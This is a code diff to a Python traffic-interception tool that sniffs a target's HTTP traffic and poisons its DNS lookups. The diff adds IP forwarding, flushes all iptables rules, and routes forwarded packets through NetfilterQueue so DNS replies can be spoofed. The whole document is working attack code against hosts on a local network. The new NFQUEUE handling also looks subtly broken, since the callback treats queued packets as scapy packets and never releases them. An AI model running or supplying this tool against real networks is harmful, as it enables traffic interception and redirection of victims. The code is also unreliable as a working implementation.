@@ -9,6 +9,8 @@ from mac_vendor_lookup import MacLookup, VendorNotFoundError
 import os
 import platform
 import ctypes
+import subprocess
+from netfilterqueue import NetfilterQueue
 
 # Check platform and privileges
 if platform.system() == "Windows":
@@ -99,6 +101,17 @@ class Device:
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
 
+    def enable_ip_forwarding(self):
+        # Enable IP forwarding using subprocess
+        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+        print(f'{Fore.GREEN}IP forwarding enabled!{Style.RESET_ALL}')
+
+    def set_iptables(self):
+        # Use iptables to forward packets to NFQUEUE
+        subprocess.call(f"iptables --flush", shell=True)
+        subprocess.call(f"iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
+        print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')
+
     def dns_poison(self, spoof_ip):
         def dns_pkt_callback(pkt):
             if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
@@ -108,8 +121,12 @@ class Device:
                                   an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
                 send(spoofed_pkt, iface=self.iface, verbose=False)
                 print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ip}{Style.RESET_ALL}')
-        sniff(iface=self.iface, prn=dns_pkt_callback,
-              filter=f'udp port 53 and host {self.targetip}', store=0)
+        
+        # Set up NFQUEUE for DNS packets
+        nfqueue = NetfilterQueue()
+        nfqueue.bind(0, dns_pkt_callback)
+        print(f'{Fore.GREEN}Listening for DNS packets in NFQUEUE...{Style.RESET_ALL}')
+        nfqueue.run()
 
     def sniff(self):
         while True:
@@ -142,6 +159,8 @@ if __name__ == '__main__':
             print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
             break
         device = Device(opts.routerip, targetip, opts.iface)
+        device.enable_ip_forwarding()
+        device.set_iptables()
         try:
             device.sniff()
         except KeyboardInterrupt:
